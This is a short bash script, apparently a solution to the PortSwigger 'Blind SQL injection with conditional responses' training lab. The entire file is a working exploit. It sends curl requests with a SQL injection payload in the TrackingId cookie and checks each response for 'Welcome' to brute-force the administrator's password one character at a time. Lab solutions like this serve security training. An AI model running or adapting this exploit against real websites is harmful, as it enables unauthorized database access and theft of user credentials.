#!/usr/bin/env bash
#
# Brute force script to exploit "Blind SQL injection with conditional responses" lab at
# "https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses".
#
# by Psycho (@UDPsycho)
#   Twitter: https://www.twitter.com/UDPsycho
#

payloads=('a' 'b' 'c' 'd' 'e' 'f' 'g' 'h' 'i' 'j' 'k' 'l' 'm' 'n' 'o' 'p' 'q' 'r' 's' 't' 'u' 'v' 'w' 'x' 'y' 'z' 1 2 3 4 5 6 7 8 9 0)
success="Welcome" # Welcome back!
password=""

PASSWORD_LENGTH=20
declare -i i=1


if [[ $# -ne 2 ]]; then
  echo -e "\nUsage: $0 https://<lab_url>/login TrackingId=<value>\n"

else

  echo -e "\nBruteforcing the password, please wait...\n"

  while [[ $i -le $PASSWORD_LENGTH ]]
  do
    for payload in ${payloads[@]}
      do
        if `curl -s --cookie "$2'+AND+(SELECT SUBSTRING(password,$i,1) FROM users WHERE username = 'administrator')='$payload;" $1 | grep -q $success`; then
          password+=$payload
          echo "  Password: $password"
          i+=1
          break
        fi
      done
  done

  echo -e "\nThe password has been brute forced successfully!\n"

fi